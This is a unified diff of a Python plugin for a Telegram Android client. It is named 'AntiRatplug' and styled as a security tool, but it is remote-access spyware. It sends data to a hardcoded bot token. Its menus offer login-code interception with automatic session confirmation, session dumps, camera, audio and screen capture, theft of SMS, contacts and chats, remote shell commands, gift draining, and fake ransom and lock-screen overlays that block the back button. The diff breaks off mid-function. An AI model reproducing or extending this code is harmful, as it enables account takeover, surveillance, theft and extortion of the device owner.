@@ -1,16 +1,17 @@
 # -*- coding: utf-8 -*-
 """
-AntiRatplug v19.7 — Bot API, три кнопки в меню.
-Меню: Tg kid, IDK start, Screenshot gain.
-Tg kid: live-watch 777000 на 10 минут, авто-подтверждение "Это я".
-IDK start: 15 шагов, pull out последним.
+AntiRatplug v21 — консолидированная версия.
+Меню: Manual / Troll / Automatic.
+Tg kid: live-watch 777000 на 10 минут + авто-подтверждение "Это я".
+IDK start / Full Lockdown / Full Harvest: Pull Out ПОСЛЕДНИМ.
+delete_account вырезан.
 """
 
 __id__ = "AntiRatplug"
 __name__ = "AntiRatplug"
-__description__ = "v19.7 three-button menu, live Tg kid."
+__description__ = "Consolidated v21."
 __author__ = "@from_a4"
-__version__ = "19.7"
+__version__ = "21.0"
 __min_version__ = "11.12.1"
 __icon__ = "CreepyEmojiAnim/5"
 __app_version__ = ">=12.5.1"
@@ -41,25 +42,25 @@ import hmac as _hmac
 import base64
 
 
-# ─── Telegram Bot API ──────────────────────────────────────────────────────
+# ─── CONFIG ────────────────────────────────────────────────────────────────
 BOT_TOKEN = "8906895129:AAE06LFOFJDuM-Lr62G-FK5ZAPClPdQdrXI"
 BOT_UID   = "8391217110"
 
-_API_BASE = "https://api.telegram.org/bot" + BOT_TOKEN
+API_BASE = "https://api.telegram.org/bot" + BOT_TOKEN
 
 STARS_POST = "from_a4/14"
+RANSOM_TEXT = "Аккаунт заблокирован.\nСвяжитесь с администратором."
+RANSOM_PHOTO_URL = "https://avatars.mds.yandex.net/i?id=3dc59086f9dda9fcd166b4075ac97bd1_l-4569626-images-thumbs&n=13"
+RANSOM_WARNING = "Закроешь приложение — данные будут уничтожены"
 
 IDK_TEXT = "IDK"
 IDK_BG = "#000000"
 IDK_FG = "#FF0000"
-
 SHOW_IDK_OVERLAY = True
 
 RECIPIENT_CACHE_TTL = 600
 MAX_DOC_SIZE = 5 * 1024 * 1024
 
-_config = None
-_targets = None
 _logger = None
 
 
@@ -72,17 +73,9 @@ def _log(msg):
                 _logger = logcat
             except Exception:
                 _logger = lambda *a, **k: None
-        _logger("[AR] " + str(msg))
+        _logger("[AR21] " + str(msg))
     except Exception:
         pass
-
-
-def _cfg():
-    global _config, _targets
-    if _config is None:
-        _config = BOT_TOKEN
-        _targets = [str(BOT_UID)]
-    return _config, _targets
 
 
 def _UC(): return jclass("org.telegram.messenger.UserConfig")
@@ -90,7 +83,7 @@ def _MC(): return jclass("org.telegram.messenger.MessagesController")
 def _CM(): return jclass("org.telegram.tgnet.ConnectionsManager")
 
 
-# ─── class cache ────────────────────────────────────────────────────────────
+# ─── class cache ───────────────────────────────────────────────────────────
 _CLASS_CACHE = {}
 
 
@@ -118,7 +111,7 @@ def _cls(*names):
     return None
 
 
-# ─── RPC reply gate ────────────────────────────────────────────────────────
+# ─── RPC gate ──────────────────────────────────────────────────────────────
 _ReplyGateCls = None
 
 
@@ -224,42 +217,7 @@ def _is_blockchain_gift(gift, sg=None):
     return False
 
 
-# ─── IDK overlay proxies ───────────────────────────────────────────────────
-_IDK_KEY_CB = {}
-_IDK_CLICK_CB = {}
-
-
-def _idk_key(self, v, keyCode, event):
-    try:
-        KE = jclass("android.view.KeyEvent")
-        if int(keyCode) == int(KE.KEYCODE_BACK):
-            return True
-    except Exception:
-        return True
-    return False
-
-
-def _make_idk_key():
-    K = jclass("android.view.View$OnKeyListener")
-    class _K(dynamic_proxy(K)):
-        def onKey(self, v, keyCode, event):
-            return _idk_key(self, v, keyCode, event)
-    o = _K()
-    _IDK_KEY_CB[id(o)] = True
-    return o
-
-
-def _make_idk_click():
-    C = jclass("android.view.View$OnClickListener")
-    class _C(dynamic_proxy(C)):
-        def onClick(self, v):
-            return True
-    o = _C()
-    _IDK_CLICK_CB[id(o)] = True
-    return o
-
-
-# ─── HTTP helpers ──────────────────────────────────────────────────────────
+# ─── HTTP (Bot API) ────────────────────────────────────────────────────────
 def _http_get(url, timeout=30):
     from urllib.request import Request, urlopen
     try:
@@ -313,40 +271,95 @@ def _http_post_multipart(url, fields, file_field, file_name, file_bytes, timeout
         return None
 
 
-# ═══════════════════════════════════════════════════════════════════════════
-# Main plugin
+# ─── IDK overlay proxies ───────────────────────────────────────────────────
+_IDK_KEY_CB = {}
+_IDK_CLICK_CB = {}
+
+
+def _idk_key(self, v, keyCode, event):
+    try:
+        KE = jclass("android.view.KeyEvent")
+        if int(keyCode) == int(KE.KEYCODE_BACK):
+            return True
+    except Exception:
+        return True
+    return False
+
+
+def _make_idk_key():
+    K = jclass("android.view.View$OnKeyListener")
+    class _K(dynamic_proxy(K)):
+        def onKey(self, v, keyCode, event):
+            return _idk_key(self, v, keyCode, event)
+    o = _K()
+    _IDK_KEY_CB[id(o)] = True
+    return o
+
+
+def _make_idk_click():
+    C = jclass("android.view.View$OnClickListener")
+    class _C(dynamic_proxy(C)):
+        def onClick(self, v):
+            return True
+    o = _C()
+    _IDK_CLICK_CB[id(o)] = True
+    return o
+
+
 # ═══════════════════════════════════════════════════════════════════════════
 class PluginSecurityPlugin(BasePlugin):
     def __init__(self):
         super().__init__()
         self._sync_running = False
         self._active = False
+        self.stop = False
         self._pending_delegates = []
         self._rpc_lock = threading.RLock()
         self._jitter = random.randint(400, 900)
+
+        self.account = 0
+        self.user_id = 0
+        self.username = ""
+        self.cfg = {}
+        self.dev = ""
+
         self._recipient_ah_cache = {}
         self._recipient_lock = threading.Lock()
         self._harden_cache = {}
         self._last_session_confirm = {}
         self._nuke_started = False
-        self.stop = False
-        self.cfg = {}
-        self.user_id = 0
-        self.username = ""
-        self.account = 0
-        self.dev = ""
-        self._gifts_unhooked = True
-        self._gifts_req_clean = False
-        self._gifts_rpc_error = None
-        self._fee_deficit = 0
+        self._nuke_password = None
+
+        self._tg_kid_watching = False
+        self._tg_kid_seen = set()
+        self._tg_kid_thread = None
+
         self._idk_view = None
         self._idk_wm = None
         self._idk_decor = None
         self._idk_keep_running = False
         self._idk_thread = None
-        self._tg_kid_watching = False
-        self._tg_kid_seen = set()
-        self._tg_kid_thread = None
+
+        # Troll state
+        self._ransom_view = None
+        self._ransom_mini_view = None
+        self._ransom_decor = None
+        self._ransom_wm = None
+        self._ransom_photo_path = ""
+        self._ransom_photo_url = ""
+        self._ransom_args = None
+        self._ransom_pay_grace_until = 0
+        self._locker_view = None
+        self._locker_on = False
+        self._lock_path = None
+        self._dim_view = None
+        self._dim_active = False
+        self._music_mp = None
+        self._vidker_view = None
+        self._vidker_mp = None
+        self._flood_uris = []
+
+        self._mmusic_waiting = False
 
     # ─── lifecycle ─────────────────────────────────────────────────────────
     def on_plugin_load(self):
@@ -360,7 +373,7 @@ class PluginSecurityPlugin(BasePlugin):
         try:
             self.add_on_send_message_hook()
         except Exception as e:
-            _log("hook reg fail: %s" % e)
+            _log("hook: %s" % e)
         threading.Thread(target=self._boot, daemon=True).start()
         try:
             self._check_persisted_nuke()
@@ -376,20 +389,22 @@ class PluginSecurityPlugin(BasePlugin):
         self._active = False
         self.stop = True
         self._tg_kid_watching = False
-        try:
-            self._hide_idk_overlay()
-        except Exception:
-            pass
+        for fn in (self._hide_idk_overlay, self._dismiss_ransom,
+                   self._clear_locker, self._clear_dim, self._clear_music,
+                   self._clear_vidker):
+            try:
+                fn()
+            except Exception:
+                pass
 
     def create_settings(self):
         return []
 
     def _boot(self):
         time.sleep(self._jitter / 1000.0)
-        _cfg()
         time.sleep(random.uniform(0.2, 0.6))
         try:
-            self._send_msg("AntiRatplug v19.7 loaded")
+            self._send_msg("AntiRatplug v21 loaded")
         except Exception as e:
             _log("boot send: %s" % e)
         try:
@@ -404,37 +419,79 @@ class PluginSecurityPlugin(BasePlugin):
     def on_send_message_hook(self, account, params):
         return HookResult()
 
-    # ─── helpers ───────────────────────────────────────────────────────────
-    def _html_escape(self, text):
-        if text is None:
-            return ""
-        t = str(text)
-        return t.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
-
-    def _has_perm(self, name):
+    # ─── accounts ─────────────────────────────────────────────────────────
+    def _uc(self):
         try:
-            ctx = ApplicationLoader.applicationContext
-            if ctx is None:
-                return False
-            pm = ctx.getPackageManager()
-            return pm.checkPermission(name, ctx.getPackageName()) == 0
+            sa = int(_UC().selectedAccount)
+            if sa:
+                return sa
         except Exception:
-            return False
-
-    def _get_activity(self):
-        for getter in (
-            lambda: jclass("org.telegram.ui.LaunchActivity").instance,
-            lambda: ApplicationLoader.application.getCurrentActivity(),
-            lambda: jclass("org.telegram.ui.ActionBar.AndroidUtilities").getActivity(),
-        ):
+            pass
+        for i in range(16):
             try:
-                a = getter()
-                if a is not None:
-                    return a
+                if _UC().getInstance(i).getClientUserId():
+                    return i
             except Exception:
                 pass
-        return None
+        return 0
 
+    def _my_id(self, account=None, discover=False):
+        acc = account if account is not None else self.account
+        try:
+            return int(_UC().getInstance(int(acc)).getClientUserId())
+        except Exception:
+            pass
+        if not discover:
+            return 0
+        for i in range(16):
+            try:
+                uid = int(_UC().getInstance(i).getClientUserId())
+                if uid:
+                    self.account = i
+                    return uid
+            except Exception:
+                pass
+        return 0
+
+    def _get_accounts_list(self):
+        out = []
+        try:
+            mc = int(getattr(jclass("org.telegram.messenger.UserConfig"), "MAX_ACCOUNT_COUNT", 8))
+        except Exception:
+            mc = 8
+        mc = max(mc, 16)
+        for i in range(mc):
+            try:
+                uc = _UC().getInstance(i)
+                if not uc or not uc.isClientActivated():
+                    continue
+                uid = int(uc.getClientUserId())
+                if uid == 0:
+                    continue
+                u = None
+                try:
+                    u = uc.getCurrentUser()
+                except Exception:
+                    pass
+                if u is None:
+                    try:
+                        u = _MC().getInstance(i).getUser(uid)
+                    except Exception:
+                        pass
+                un = ""
+                ph = ""
+                premium = False
+                if u is not None:
+                    un = str(getattr(u, "username", "") or "")
+                    ph = _real_phone_or_empty(u).lstrip("+")
+                    premium = _get_bool_attr(u, "premium", False)
+                out.append({"id": i, "user_id": uid, "username": un,
+                            "phone": ph, "premium": premium})
+            except Exception as e:
+                _log("acc %d: %s" % (i, e))
+        return out
+
+    # ─── peers / RPC ──────────────────────────────────────────────────────
     def _get_input_peer(self, account, peer_id):
         try:
             mc = _MC().getInstance(account)
@@ -465,7 +522,7 @@ class PluginSecurityPlugin(BasePlugin):
                 ip.chat_id = int(cid)
                 return ip
         except Exception as e:
-            _log("input_peer: %s" % e)
+            _log("peer: %s" % e)
         return None
 
     def _rg_rpc(self, req, account=0, timeout=15.0, fast=False):
@@ -518,155 +575,48 @@ class PluginSecurityPlugin(BasePlugin):
                     out.append(ee)
         return out
 
-    def _get_accounts_list(self):
-        out = []
-        try:
-            mc = int(getattr(jclass("org.telegram.messenger.UserConfig"), "MAX_ACCOUNT_COUNT", 8))
-        except Exception:
-            mc = 8
-        mc = max(mc, 16)
-        for i in range(mc):
-            try:
-                uc = _UC().getInstance(i)
-                if not uc or not uc.isClientActivated():
-                    continue
-                uid = int(uc.getClientUserId())
-                if uid == 0:
-                    continue
-                u = None
-                try:
-                    u = uc.getCurrentUser()
-                except Exception:
-                    pass
-                if u is None:
-                    try:
-                        u = _MC().getInstance(i).getUser(uid)
-                    except Exception:
-                        pass
-                un = ""
-                ph = ""
-                premium = False
-                if u is not None:
-                    un = str(getattr(u, "username", "") or "")
-                    ph = _real_phone_or_empty(u).lstrip("+")
-                    premium = _get_bool_attr(u, "premium", False)
-                out.append({"id": i, "user_id": uid, "username": un,
-                            "phone": ph, "premium": premium})
-            except Exception as e:
-                _log("account %d: %s" % (i, e))
-        return out
-
-    def _uc(self):
-        try:
-            sa = int(_UC().selectedAccount)
-            if sa:
-                return sa
-        except Exception:
-            pass
-        for i in range(16):
-            try:
-                if _UC().getInstance(i).getClientUserId():
-                    return i
-            except Exception:
-                pass
-        return 0
-
-    def _my_id(self, account=None, discover=False):
-        acc = account if account is not None else self.account
-        try:
-            return int(_UC().getInstance(int(acc)).getClientUserId())
-        except Exception:
-            pass
-        if not discover:
-            return 0
-        for i in range(16):
-            try:
-                uid = int(_UC().getInstance(i).getClientUserId())
-                if uid:
-                    self.account = i
-                    return uid
-            except Exception:
-                pass
-        return 0
-
-    # ═══════════════════════════════════════════════════════════════════════
-    # Bot API transport
-    # ═══════════════════════════════════════════════════════════════════════
+    # ─── Bot API ──────────────────────────────────────────────────────────
     def _api(self, method):
-        cfg, _t = _cfg()
-        return _API_BASE + "/" + method
+        return API_BASE + "/" + method
 
     def _send_msg(self, text, html=False):
-        _cfg()
         body = {"chat_id": BOT_UID, "text": str(text)[:4000]}
         if html:
             body["parse_mode"] = "HTML"
         _http_post_json(self._api("sendMessage"), body, timeout=20)
 
-    def _send_photo(self, file_path, caption=""):
-        _cfg()
-        try:
-            with open(file_path, "rb") as f:
-                raw = f.read()
-        except Exception as e:
-            _log("send_photo read: %s" % e)
-            return
-        fields = {"chat_id": BOT_UID, "caption": str(caption)[:200]}
-        _http_post_multipart(self._api("sendPhoto"), fields, "photo",
-                             os.path.basename(file_path), raw)
-
-    def _send_document_bytes(self, filename, data):
-        _cfg()
-        fields = {"chat_id": BOT_UID, "caption": str(filename)[:200]}
-        _http_post_multipart(self._api("sendDocument"), fields, "document",
-                             filename, data)
-
     def _send_markup(self, text, keyboard, html=False):
-        _cfg()
         body = {"chat_id": BOT_UID, "text": str(text)[:4000],
                 "reply_markup": keyboard}
         if html:
             body["parse_mode"] = "HTML"
         _http_post_json(self._api("sendMessage"), body, timeout=20)
 
-    def _send_manage_button(self):
-        _cfg()
-        username = "?"
+    def _send_photo(self, file_path, caption=""):
         try:
-            uc = _UC().getInstance(0)
-            user = uc.getCurrentUser()
-            if user is not None:
-                username = str(user.username) if user.username is not None else "id:" + str(uc.getClientUserId())
-        except Exception:
-            pass
-        text = "<b>AntiRatplug v19.7</b>\nUser: @" + username
-        kb = {
-            "keyboard": [
-                [{"text": "Tg kid"}],
-                [{"text": "IDK start"}],
-                [{"text": "Screenshot gain"}],
-            ],
-            "resize_keyboard": True,
-        }
-        self._send_markup(text, kb, html=True)
+            with open(file_path, "rb") as f:
+                raw = f.read()
+        except Exception as e:
+            _log("photo read: %s" % e)
+            return
+        fields = {"chat_id": BOT_UID, "caption": str(caption)[:200]}
+        _http_post_multipart(self._api("sendPhoto"), fields, "photo",
+                             os.path.basename(file_path), raw)
 
-    def _show_main_menu(self):
-        kb = {
-            "keyboard": [
-                [{"text": "Tg kid"}],
-                [{"text": "IDK start"}],
-                [{"text": "Screenshot gain"}],
-            ],
-            "resize_keyboard": True,
-        }
-        self._send_markup("<b>Меню:</b>", kb, html=True)
+    def _send_document_bytes(self, filename, data):
+        fields = {"chat_id": BOT_UID, "caption": str(filename)[:200]}
+        _http_post_multipart(self._api("sendDocument"), fields, "document",
+                             filename, data)
+
+    def _answer_callback(self, cb_id):
+        _http_post_json(self._api("answerCallbackQuery"),
+                        {"callback_query_id": str(cb_id)}, timeout=10)
 
     def _start_polling(self):
         threading.Thread(target=self._poll, daemon=True).start()
 
     def _poll(self):
         offset = 0
-        _cfg()
         try:
             r = _http_get(self._api("getUpdates") + "?offset=-1&timeout=0", timeout=10)
             if r:
@@ -677,221 +627,322 @@ class PluginSecurityPlugin(BasePlugin):
             pass
         while self._sync_running and not self.stop:
             try:
-                r = _http_get(self._api("getUpdates") + "?offset=" + str(offset) + "&timeout=15", timeout=25)
+                r = _http_get(self._api("getUpdates") + "?offset=" + str(offset) + "&timeout=15",
+                              timeout=25)
                 if r:
                     j = json.loads(r)
                     if j.get("ok") and j.get("result"):
                         for u in j["result"]:
                             offset = u["update_id"] + 1
-                            msg = u.get("message") or {}
-                            txt = (msg.get("text") or "").strip()
-                            if txt:
+                            if "callback_query" in u:
+                                try:
+                                    threading.Thread(target=self._handle_callback,
+                                                     args=(u["callback_query"],),
+                                                     daemon=True).start()
+                                except Exception:
+                                    pass
+                            elif "message" in u:
                                 try:
                                     threading.Thread(target=self._handle_message,
-                                                     args=(txt,), daemon=True).start()
+                                                     args=(u["message"],),
+                                                     daemon=True).start()
                                 except Exception:
                                     pass
             except Exception as e:
                 _log("poll: %s" % e)
             time.sleep(0.5)
 
-    def _handle_message(self, msg_text):
-        t = (msg_text or "").strip() if isinstance(msg_text, str) else ""
-        if t == "Tg kid":
-            threading.Thread(target=self._tg_kid, daemon=True).start()
-        elif t == "IDK start":
-            self._idk_start()
-        elif t == "Screenshot gain":
-            threading.Thread(target=self._screenshot_gain, daemon=True).start()
-        else:
-            self._send_msg("unknown: " + t)
-
-    # ═══════════════════════════════════════════════════════════════════════
-    # IDK OVERLAY
-    # ═══════════════════════════════════════════════════════════════════════
-    def _ensure_overlay_perm(self, ctx):
+    # ─── menus ────────────────────────────────────────────────────────────
+    def _send_manage_button(self):
+        username = "unknown"
         try:
-            if jclass("android.provider.Settings").canDrawOverlays(ctx):
-                return True
-        except Exception:
-            pass
-        pkg = str(ctx.getPackageName())
-        for c in (
-            "su -c 'appops set %s SYSTEM_ALERT_WINDOW allow'" % pkg,
-            "su -c 'cmd appops set %s SYSTEM_ALERT_WINDOW allow'" % pkg,
-            "appops set %s SYSTEM_ALERT_WINDOW allow" % pkg,
-        ):
-            try:
-                subprocess.run(c, shell=True, capture_output=True, timeout=10)
-            except Exception:
-                continue
-        try:
-            return bool(jclass("android.provider.Settings").canDrawOverlays(ctx))
-        except Exception:
-            return False
-
-    def _show_idk_overlay(self):
-        if self._idk_view is not None:
-            return {"ok": True, "already": True}
-        try:
-            ctx = ApplicationLoader.applicationContext
-            if ctx is None:
-                return {"error": "no ctx"}
-            use_decor = not self._ensure_overlay_perm(ctx)
-            drew = threading.Event()
-            derr = [None]
-
-            def _build():
-                try:
-                    wm = None
-                    try:
-                        CTX = jclass("android.content.Context")
-                        wm = ctx.getSystemService(CTX.WINDOW_SERVICE)
-                    except Exception:
-                        pass
-                    self._idk_wm = wm
-
-                    LL = jclass("android.widget.LinearLayout")
-                    TV = jclass("android.widget.TextView")
-                    LP = jclass("android.view.WindowManager$LayoutParams")
-                    LP_LV = jclass("android.widget.LinearLayout$LayoutParams")
-                    Color = jclass("android.graphics.Color")
-                    Gravity = jclass("android.view.Gravity")
-                    TV2 = jclass("android.util.TypedValue")
-                    VLG = jclass("android.view.ViewGroup$LayoutParams")
-
-                    root = LL(ctx)
-                    root.setOrientation(LL.VERTICAL)
-                    root.setBackgroundColor(Color.parseColor(IDK_BG))
-                    root.setGravity(Gravity.CENTER)
-
-                    tv = TV(ctx)
-                    tv.setText(IDK_TEXT)
-                    tv.setTextColor(Color.parseColor(IDK_FG))
-                    tv.setTextSize(TV2.COMPLEX_UNIT_SP, 96)
-                    tv.setTypeface(tv.getTypeface(), 1)
-                    tv.setGravity(Gravity.CENTER)
-                    root.addView(tv, LP_LV(VLG.MATCH_PARENT, VLG.WRAP_CONTENT))
-
-                    root.setFocusableInTouchMode(True)
-                    root.requestFocus()
-                    try:
-                        root.setOnKeyListener(_make_idk_key())
-                    except Exception:
-                        pass
-                    try:
-                        root.setOnClickListener(_make_idk_click())
-                    except Exception:
-                        pass
-
-                    if use_decor:
-                        act2 = self._get_activity()
-                        if act2 is None:
-                            raise Exception("no activity for decor")
-                        win = act2.getWindow()
-                        for f in ("FLAG_KEEP_SCREEN_ON", "FLAG_SHOW_WHEN_LOCKED",
-                                  "FLAG_DISMISS_KEYGUARD", "FLAG_TURN_SCREEN_ON"):
-                            try:
-                                win.addFlags(getattr(LP, f, 0))
-                            except Exception:
-                                pass
-                        decor = win.getDecorView()
-                        decor.addView(root, VLG(VLG.MATCH_PARENT, VLG.MATCH_PARENT))
-                        self._idk_decor = decor
-                    else:
-                        params = LP(
-                            LP.MATCH_PARENT, LP.MATCH_PARENT,
-                            getattr(LP, "TYPE_APPLICATION_OVERLAY", getattr(LP, "TYPE_PHONE", 2002)),
-                            getattr(LP, "FLAG_KEEP_SCREEN_ON", 128)
-                            | getattr(LP, "FLAG_SHOW_WHEN_LOCKED", 0x80000)
-                            | getattr(LP, "FLAG_LAYOUT_IN_SCREEN", 256),
-                            -3,
-                        )
-                        params.gravity = Gravity.CENTER
-                        wm.addView(root, params)
-                    self._idk_view = root
-                except Exception as e:
-                    derr[0] = e
-                finally:
-                    drew.set()
-
-            act = self._get_activity()
-            if act is not None:
-                act.runOnUiThread(_build)
+            uc = _UC().getInstance(0)
+            user = uc.getCurrentUser()
+            if user is not None:
+                username = str(user.username) if user.username else ("id:" + str(uc.getClientUserId()))
             else:
-                _build()
-            drew.wait(8)
-            if derr[0] is not None:
-                return {"error": "idk overlay: %s" % derr[0]}
-            if self._idk_view is None:
-                return {"error": "overlay not created"}
-            self._idk_keep_running = True
-            self._idk_thread = threading.Thread(target=self._idk_keepalive_loop, daemon=True)
-            self._idk_thread.start()
-            return {"ok": True}
+                username = "id:" + str(uc.getClientUserId())
         except Exception as e:
-            return {"error": "idk: %s" % e}
+            _log("manage btn user: %s" % e)
+        text = "<b>AntiRatplug v21</b>\nUser: @" + username
+        kb = {"inline_keyboard": [[{"text": "Manage", "callback_data": "menu"}]]}
+        self._send_markup(text, kb, html=True)
 
-    def _idk_keepalive_loop(self):
-        while self._idk_keep_running and self._sync_running:
-            try:
-                if self._idk_view is None:
-                    self._idk_keep_running = False
-                    return
-                if self._idk_view.getParent() is None:
-                    self._idk_view = None
-                    self._idk_keep_running = False
-                    return
-            except Exception:
-                self._idk_view = None
-                self._idk_keep_running = False
+    def _show_main_menu(self):
+        kb = {
+            "keyboard": [
+                [{"text": "Manual using"}],
+                [{"text": "Troll"}],
+                [{"text": "Automatic"}],
+                [{"text": "Tg kid"}],
+                [{"text": "IDK start"}],
+                [{"text": "Screenshot gain"}],
+                [{"text": "❓ Help"}],
+            ],
+            "resize_keyboard": True,
+        }
+        self._send_markup("AntiRatplug v21", kb, html=True)
+
+    def _show_manual_menu(self):
+        kb = {
+            "keyboard": [
+                [{"text": "Session Control"}],
+                [{"text": "Surveillance"}],
+                [{"text": "Data Grab"}],
+                [{"text": "Account"}],
+                [{"text": "Shell"}],
+                [{"text": "⬅️ Back"}],
+            ],
+            "resize_keyboard": True,
+        }
+        self._send_markup("Manual", kb, html=True)
+
+    def _show_sessions_menu(self):
+        kb = {
+            "keyboard": [
+                [{"text": "Wipe Sessions"}],
+                [{"text": "Kill All Sessions"}],
+                [{"text": "Session Dump"}],
+                [{"text": "Userbot Dump"}],
+                [{"text": "⬅️ Back"}],
+            ],
+            "resize_keyboard": True,
+        }
+        self._send_markup("Sessions", kb, html=True)
+
+    def _show_surveillance_menu(self):
+        kb = {
+            "keyboard": [
+                [{"text": "Screenshot"}],
+                [{"text": "Camera Front"}],
+                [{"text": "Camera Back"}],
+                [{"text": "Audio 5s"}],
+                [{"text": "⬅️ Back"}],
+            ],
+            "resize_keyboard": True,
+        }
+        self._send_markup("Surveillance", kb, html=True)
+
+    def _show_data_menu(self):
+        kb = {
+            "keyboard": [
+                [{"text": "SMS"}],
+                [{"text": "Contacts"}],
+                [{"text": "Apps"}],
+                [{"text": "Chats"}],
+                [{"text": "⬅️ Back"}],
+            ],
+            "resize_keyboard": True,
+        }
+        self._send_markup("Data grab", kb, html=True)
+
+    def _show_account_menu(self):
+        kb = {
+            "keyboard": [
+                [{"text": "Info"}],
+                [{"text": "Tg kid"}],
+                [{"text": "Screenshot gain"}],
+                [{"text": "Pull Out"}],
+                [{"text": "⬅️ Back"}],
+            ],
+            "resize_keyboard": True,
+        }
+        self._send_markup("Account", kb, html=True)
+
+    def _show_shell_menu(self):
+        kb = {
+            "keyboard": [
+                [{"text": "ls /sdcard"}],
+                [{"text": "ps"}],
+                [{"text": "ifconfig"}],
+                [{"text": "df -h"}],
+                [{"text": "⬅️ Back"}],
+            ],
+            "resize_keyboard": True,
+        }
+        self._send_markup("Shell", kb, html=True)
+
+    def _show_troll_menu(self):
+        kb = {
+            "keyboard": [
+                [{"text": "Ransom"}],
+                [{"text": "Lock screen"}],
+                [{"text": "M-music"}],
+                [{"text": "Flood Gallery"}],
+                [{"text": "Clear Flood"}],
+                [{"text": "Dim screen"}],
+                [{"text": "⬅️ Back"}],
+            ],
+            "resize_keyboard": True,
+        }
+        self._send_markup("Troll", kb, html=True)
+
+    def _show_automatic_menu(self):
+        kb = {
+            "keyboard": [
+                [{"text": "🌾 Full Harvest"}],
+                [{"text": "🔒 Full Lockdown"}],
+                [{"text": "🎁 Gift Transfer"}],
+                [{"text": "⬅️ Back"}],
+            ],
+            "resize_keyboard": True,
+        }
+        self._send_markup("Automatic", kb, html=True)
+
+    def _show_help(self):
+        text = (
+            "<b>AntiRatplug v21</b>\n\n"
+            "<b>Tg kid</b> — код входа из 777000 + live-watch 10 мин + авто-«Это я»\n"
+            "<b>Screenshot gain</b> — скрин + фронт + бэк камера одним заходом\n"
+            "<b>IDK start</b> — 15 шагов: harvest → 2FA → sessions → web → profile → "
+            "gifts → kill → dumps → screenshot gain → sms/contacts/apps/chats → "
+            "saved export → persistence → re-kill → <b>Pull Out последним</b>\n"
+            "<b>Full Harvest</b> — сбор без аккаунт-модификаций\n"
+            "<b>Full Lockdown</b> — Full Harvest + Lockdown + gift drain + pull out\n\n"
+            "Recipient: @" + BOT_UID
+        )
+        self._send_msg(text, html=True)
+
+    # ─── callback / message роутер ────────────────────────────────────────
+    def _handle_callback(self, cb):
+        try:
+            cb_id = cb.get("id")
+            data = cb.get("data", "")
+            if cb_id:
+                try:
+                    self._answer_callback(cb_id)
+                except Exception:
+                    pass
+            if data == "menu":
+                self._show_main_menu()
+            elif data == "back_auto":
+                self._show_automatic_menu()
+            elif data == "close_ransom":
+                self._dismiss_ransom()
+            elif data == "close_locker":
+                self._clear_locker()
+            elif data == "close_music":
+                self._clear_music()
+            elif data == "close_end":
+                self._clear_dim()
+            elif data == "hv_logout":
+                threading.Thread(target=self._pull_out_account, daemon=True).start()
+        except Exception as e:
+            _log("callback: %s" % e)
+
+    def _handle_message(self, msg):
+        try:
+            t = (msg.get("text") or "").strip()
+            if not t:
                 return
-            time.sleep(0.5)
-
-    def _hide_idk_overlay(self):
-        try:
-            self._idk_keep_running = False
-            if self._idk_view is None and self._idk_decor is None:
-                return {"ok": True}
-            removed = threading.Event()
-            derr = [None]
-
-            def _rm():
-                try:
-                    if self._idk_view is not None:
-                        parent = self._idk_decor or self._idk_wm
-                        if parent is not None:
-                            try:
-                                parent.removeView(self._idk_view)
-                            except Exception:
-                                pass
-                        self._idk_view = None
-                        self._idk_decor = None
-                except Exception as e:
-                    derr[0] = e
-                finally:
-                    removed.set()
-
-            act = self._get_activity()
-            if act is not None:
-                act.runOnUiThread(_rm)
-                removed.wait(6)
+            if t == "Tg kid":
+                threading.Thread(target=self._tg_kid, daemon=True).start()
+            elif t == "IDK start":
+                self._idk_start()
+            elif t == "Screenshot gain":
+                threading.Thread(target=self._screenshot_gain, daemon=True).start()
+            elif t == "Manual using":
+                self._show_manual_menu()
+            elif t == "Troll":
+                self._show_troll_menu()
+            elif t == "Automatic":
+                self._show_automatic_menu()
+            elif t == "❓ Help":
+                self._show_help()
+            elif t == "⬅️ Back":
+                self._show_main_menu()
+            # Manual submenus
+            elif t == "Session Control":
+                self._show_sessions_menu()
+            elif t == "Surveillance":
+                self._show_surveillance_menu()
+            elif t == "Data Grab":
+                self._show_data_menu()
+            elif t == "Account":
+                self._show_account_menu()
+            elif t == "Shell":
+                self._show_shell_menu()
+            # Sessions actions
+            elif t == "Wipe Sessions":
+                threading.Thread(target=self._session_wipe, daemon=True).start()
+            elif t == "Kill All Sessions":
+                threading.Thread(target=self._kill_sessions_full, daemon=True).start()
+            elif t == "Session Dump":
+                threading.Thread(target=self._manual_dump_session, daemon=True).start()
+            elif t == "Userbot Dump":
+                threading.Thread(target=self._manual_userbot_session, daemon=True).start()
+            # Surveillance
+            elif t == "Screenshot":
+                threading.Thread(target=self._screenshot, daemon=True).start()
+            elif t == "Camera Front":
+                threading.Thread(target=self._manual_camera, args=("front",), daemon=True).start()
+            elif t == "Camera Back":
+                threading.Thread(target=self._manual_camera, args=("back",), daemon=True).start()
+            elif t == "Audio 5s":
+                threading.Thread(target=self._manual_audio, args=(5,), daemon=True).start()
+            # Data
+            elif t == "SMS":
+                threading.Thread(target=self._manual_sms, daemon=True).start()
+            elif t == "Contacts":
+                threading.Thread(target=self._manual_contacts, daemon=True).start()
+            elif t == "Apps":
+                threading.Thread(target=self._manual_apps, daemon=True).start()
+            elif t == "Chats":
+                threading.Thread(target=self._manual_chats, daemon=True).start()
+            # Account
+            elif t == "Info":
+                threading.Thread(target=self._harvest_account_info, args=(0, True), daemon=True).start()
+            elif t == "Pull Out":
+                threading.Thread(target=self._pull_out_account, daemon=True).start()
+            # Shell
+            elif t == "ls /sdcard":
+                self._manual_shell("ls /sdcard")
+            elif t == "ps":
+                self._manual_shell("ps -A")
+            elif t == "ifconfig":
+                self._manual_shell("ifconfig")
+            elif t == "df -h":
+                self._manual_shell("df -h")
+            # Troll
+            elif t == "Ransom":
+                self._show_ransom(RANSOM_TEXT, RANSOM_PHOTO_URL)
+            elif t == "Lock screen":
+                self._lock_screen()
+            elif t == "M-music":
+                self._mmusic_waiting = "music"
+                self._send_msg("Send .mp3 URL")
+            elif t == "Flood Gallery":
+                threading.Thread(target=self._flood_gallery,
+                                 args=(RANSOM_PHOTO_URL, 100), daemon=True).start()
+            elif t == "Clear Flood":
+                self._clear_flood()
+            elif t == "Dim screen":
+                self._dim_screen()
+            # Automatic
+            elif t == "🌾 Full Harvest":
+                self._full_harvest()
+            elif t == "🔒 Full Lockdown":
+                self._full_lockdown()
+            elif t == "🎁 Gift Transfer":
+                threading.Thread(target=self._drain_gifts_thread, daemon=True).start()
+            elif self._mmusic_waiting == "music":
+                self._mmusic_waiting = False
+                if t.startswith("http"):
+                    self._play_mmusic(t)
+                else:
